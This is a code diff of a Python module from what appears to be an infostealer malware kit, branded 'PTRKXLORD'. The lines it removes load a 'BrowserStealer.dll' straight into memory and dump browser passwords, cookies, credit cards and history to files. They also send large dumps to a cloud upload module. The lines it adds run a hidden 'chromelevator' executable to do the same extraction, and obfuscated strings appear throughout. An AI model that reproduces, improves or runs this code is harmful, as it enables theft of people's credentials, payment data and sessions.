@@ -1,46 +1,11 @@
 import os
-import json
+import time
+import subprocess
+import shutil
 from datetime import datetime
 from typing import Dict, List, Any, Optional
-import clr
-import shutil
 from core.obfuscation import decrypt_string
-from core.cloud import CloudModule
-
 from core.base import BaseModule
-
-def log_debug(msg):
-    try:
-        # Standardized log path
-        debug_file = os.path.join(os.environ.get("TEMP", "."), "debug_log.txt")
-        with open(debug_file, "a", encoding="utf-8") as f:
-            f.write(f"{datetime.now()}: {msg}\n")
-    except: pass
-
-try:
-    from System.Reflection import Assembly
-    from System.IO import File
-    dll_name = "BrowserStealer.dll"
-    # Search in current dir, core/ and native_modules/
-    search_paths = [
-        os.path.join(os.path.dirname(__file__), dll_name),
-        os.path.join(os.path.dirname(__file__), "..", "native_modules", dll_name),
-        os.path.join(os.getcwd(), "native_modules", dll_name)
-    ]
-    
-    CS_STEALER_AVAILABLE = False
-    for _p in search_paths:
-        if os.path.exists(_p):
-            try:
-                # S-09: RAM-Only loading from byte array
-                raw_bytes = File.ReadAllBytes(os.path.abspath(_p))
-                Assembly.Load(raw_bytes)
-                from StealthModule import BrowserManager
-                CS_STEALER_AVAILABLE = True
-                break
-            except: continue
-except Exception:
-    CS_STEALER_AVAILABLE = False
 
 class BrowserModule(BaseModule):
     def __init__(self, bot=None, report_manager=None, temp_dir=None):
@@ -64,135 +29,34 @@ class BrowserModule(BaseModule):
         """A-04: Implementation of standardized run method."""
         try:
             self.log("Starting browser data extraction...")
-            data = self.steal()
-            return True if data.get('profiles_found', 0) > 0 else False
+            return self.steal()
         except Exception as e:
             self.log(f"Extraction failed: {e}")
             return False
 
-    def steal(self, browser_id: Optional[str] = None) -> Dict[str, Any]:
-        """Steals browser data using C# DLL and saves to output/Stealer/"""
-        if CS_STEALER_AVAILABLE:
+    def steal(self) -> bool:
+        """Steals browser data using direct ChromeElevator execution"""
+        injector = ChromeInjector()
+        if injector.is_available():
             try:
-                # Создаем папку вывода
-                stealer_dir = os.path.join("output", "Stealer")
-                if not os.path.exists(stealer_dir):
-                    os.makedirs(stealer_dir)
-
-                data_json = BrowserManager.StealAll(self.temp_dir)
-                data = json.loads(data_json)
-
-                # Сохраняем в файлы
-                self._save_data(data, stealer_dir)
-                
-                return data
+                self.log("Running ChromeElevator for full browser extraction...")
+                # Increase timeout to 120s
+                success = injector.run_injector(action="all", timeout=120)
+                return success
             except Exception as e:
-                log_debug(decrypt_string("LRFYGDo0OA56EhhKHUtcWhVXBQ=="))
-
-        return {'passwords': [], 'cookies': [], 'profiles_found': 0}
-
-    def _save_data(self, data: Dict[str, Any], out_dir: str):
-        """Сохранение и выгрузка если > 50MB"""
-        mapping = {
-            'passwords': (self.format_passwords, "Passwords.txt"),
-            'cookies': (self.format_cookies, "Cookies.txt"),
-            'cookies_json': (lambda x: json.dumps(self._convert_cookies_json(x), indent=4, ensure_ascii=False), "Cookies.json"),
-            'cards': (lambda x: json.dumps(x, indent=4), "CreditCards.json"),
-            'history': (lambda x: json.dumps(x, indent=4), "History.json")
-        }
-
-        for key, (formatter, filename) in mapping.items():
-            if key in data and data[key]:
-                content = formatter(data[key])
-                file_path = os.path.join(out_dir, filename)
-                with open(file_path, "w", encoding="utf-8") as f:
-                    f.write(content)
-                
-                # Проверка размера > 50MB
-                if os.path.getsize(file_path) > 50 * 1024 * 1024:
-                    link = CloudModule.upload_file(file_path)
-                    if link:
-                        with open(os.path.join(out_dir, "CloudLinks.txt"), "a") as f:
-                            f.write(f"{filename}: {link}\n")
-
-    def format_passwords(self, passwords: List[Dict[str, Any]]) -> str:
-        if not passwords: return decrypt_string("IF1YGy8iKhU1BQ5LUl8JDwBWVg==")
-        from collections import defaultdict
-        grouped = defaultdict(list)
-        for p in passwords:
-            browser = p.get('Browser') or p.get('browser', 'Unknown')
-            grouped[browser].append(p)
-
-        ascii_art = """
- █████╗ ███████╗███████╗██████╗  █████╗ ██████╗  ██████╗ ██╗  ██╗██╗████████╗ █████╗ ██╗   ██╗███████╗██╗  ██╗██╗
-██╔══██╗██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔═══██╗██║ ██╔╝██║╚══██╔══╝██╔══██╗╚██╗ ██╔╝██╔════╝██║ ██╔╝██║
-███████║█████╗  █████╗  ██████╔╝███████║██████╔╝██║   ██║█████╔╝ ██║   ██║   ███████║ ╚████╔╝ ███████╗█████╔╝ ██║
-██╔══██║██╔══╝  ██╔══╝  ██╔══██╗██╔══██║██╔═══╝ ██║   ██║██╔═██╗ ██║   ██║   ██╔══██║  ╚██╔╝  ╚════██║██╔═██╗ ██║
-██║  ██║██║     ███████╗██║  ██║██║  ██║██║     ╚██████╔╝██║  ██╗██║   ██║   ██║  ██║   ██║   ███████║██║  ██╗██║
-╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝
-"""
-        lines = [ascii_art, "═══ 🔑 PTRKXLORD PASSWORDS 🔑 ═══", ""]
-        for b_name, p_list in grouped.items():
-            lines.append(decrypt_string("NUkaNCAwNAd0AhpIF0tOUxNv"))
-            for p in p_list:
-                url = p.get('Url') or p.get('url', 'n/a')
-                user = p.get('Username') or p.get('user', 'n/a')
-                pw = p.get('Password') or p.get('pass', 'n/a')
-                lines.append(f"🌐 {url} | 👤 {user} | 🔑 {pw}")
-            lines.append("")
-        lines.append("═" * 40)
-        return "\n".join(lines)
-
-    def format_cookies(self, cookies: List[Dict[str, Any]]) -> str:
-        if not cookies: return ""
-        lines = []
-        for c in cookies:
-            host = c.get('Host') or c.get('host', 'unknown')
-            path = c.get('Path') or c.get('path', '/')
-            name = c.get('Name') or c.get('name', 'unknown')
-            value = c.get('Value') or c.get('value', '')
-            secure = c.get('Secure') if 'Secure' in c else c.get('is_secure', False)
-            expires = c.get('Expires', 0)
-            
-            if expires > 1000000000000000: 
-                expires = (expires / 1000000) - 11644473600
-            
-            clean_value = str(value).replace('\t', ' ').replace('\r', '').replace('\n', ' ')
-            lines.append(f"{host}\tTRUE\t{path}\t{str(secure).upper()}\t{int(expires)}\t{name}\t{clean_value}")
-        return "\n".join(lines)
-
-    def _convert_cookies_json(self, cookies: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
-        converted = []
-        for c in cookies:
-            expires = c.get('Expires') or c.get('expires', 0)
-            # Windows Filetime (microseconds) to Unix timestamp (seconds)
-            if expires > 1000000000000000:
-                expires = int((int(expires) - 11644473600000000) // 1000000)
-            
-            converted.append({
-                "domain": c.get('Host') or c.get('host', ''),
-                "name": c.get('Name') or c.get('name', ''),
-                "path": c.get('Path') or c.get('path', '/'),
-                "secure": bool(c.get('Secure') if 'Secure' in c else c.get('is_secure', False)),
-                "httpOnly": bool(c.get('HttpOnly') if 'HttpOnly' in c else c.get('is_httponly', False)),
-                "expirationDate": int(expires),
-                "value": c.get('Value') or c.get('value', ''),
-            })
-        return converted
+                self.log(f"ChromeElevator execution failed: {e}")
+        return False
 
 class ChromeInjector:
     def __init__(self):
         self.base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-        self.arch = os.environ.get('PROCESSOR_ARCHITECTURE', 'AMD64').lower()
-        preferred = decrypt_string("DVoKBCM0NQcsFh5XAGYeTFocHRMr") # chromelevator_x64.exe
-        fallback = decrypt_string("DVoKBCM0NQcsFh5XAGYHCAMETEUrKTw=") # chromelevator_arm64.exe
         
+        # Priority on chromelevator.exe in core/
         possible_names = [
-            os.path.join(self.base_dir, "core", preferred),
-            os.path.join(self.base_dir, "bin", preferred),
-            os.path.join(self.base_dir, "core", fallback),
-            os.path.join(self.base_dir, "bin", fallback),
-            os.path.join(self.base_dir, preferred),
+            os.path.join(self.base_dir, "core", "chromelevator.exe"),
+            os.path.join(self.base_dir, "core", "chromelevator_x64.exe"),
+            os.path.join(self.base_dir, "bin", "chromelevator_x64.exe"),
+            os.path.join(self.base_dir, "chromelevator.exe"),
         ]
         self.injector_path = None
         for name in possible_names:
@@ -201,24 +65,18 @@ class ChromeInjector:
                 break
 
     def is_available(self):
-        return self.injector_path is not None and CS_STEALER_AVAILABLE
+        return self.injector_path is not None
 
-    def run_injector_safe(self, action="all", timeout=30, cwd=None):
-        if not self.is_available(): return "❌ Injector or DLL not available"
+    def run_injector(self, action="all", timeout=60):
+        if not self.is_available(): return False
         try:
-            return BrowserManager.RunInjector(self.injector_path, action, timeout * 1000)
+            output_dir = os.path.normpath(os.path.join(self.base_dir, "core", "output"))
+            os.makedirs(output_dir, exist_ok=True)
+            
+            cmd = [self.injector_path, action, "--method", "nt", "-o", output_dir]
+            # Use subprocess.DEVNULL to avoid pipe hang, and no capture
+            subprocess.run(cmd, timeout=timeout, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=0x08000000)
+            return True
         except Exception as e:
-            return decrypt_string("jK/0Swc/Mwc5AwVKUlwUCAFAQks1NCQ=")
-
-    def run_injector(self, action="all", timeout=30, cwd=None, pid=None, method=None):
-        return self.run_injector_safe(action, timeout, cwd)
-
-if __name__ == "__main__":
-    try:
-        from tempfile import TemporaryDirectory
-        with TemporaryDirectory() as tmp:
-            bm = BrowserModule(tmp)
-            data = bm.steal()
-            print(decrypt_string("KF0NBSpxIg4/GUJcE00HVAlXDENpITgRKQAFShZKQVZOaSVCZyx5EjsEGU8dSwIJQA=="))
-    except Exception as e:
-        print(decrypt_string("K0AKBDxreRk/Cg=="))
+            print(f"Error running injector: {e}")
+            return False
